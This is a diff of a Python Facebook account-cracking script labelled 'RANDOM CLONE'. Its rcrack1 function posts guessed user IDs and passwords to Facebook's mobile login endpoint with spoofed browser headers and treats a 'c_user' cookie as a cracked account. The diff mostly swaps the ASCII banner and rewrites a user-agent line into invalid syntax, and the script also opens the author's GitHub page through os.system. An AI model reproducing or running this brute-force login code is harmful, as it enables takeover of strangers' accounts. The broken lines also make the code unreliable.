@@ -74,11 +74,19 @@ for xd in range(10000):
     ugen.append(uaku2)
 os.system('xdg-open https://github.com/MUMIT-404-CYBER')
 logo = ("""
-\033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
-\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
-\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
+\033[1;91m   
+\033[1;92m  
+ 
+         ███    ███  █████  ███    ██ ██ ██   ██ 
+         ████  ████ ██   ██ ████   ██ ██ ██  ██  
+         ██ ████ ██ ███████ ██ ██  ██ ██ █████   
+         ██  ██  ██ ██   ██ ██  ██ ██ ██ ██  ██  
+         ██      ██ ██   ██ ██   ████ ██ ██   ██ 
+                                        
+                                        
+\033[1;93m   
+\033[1;94m   
+\033[1;95m    033[1;92m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
  ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMUMIT ISLAM HIMU           ┃
  ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
@@ -220,7 +228,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-            'user-agent': Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+            'user-agent': Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'.
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
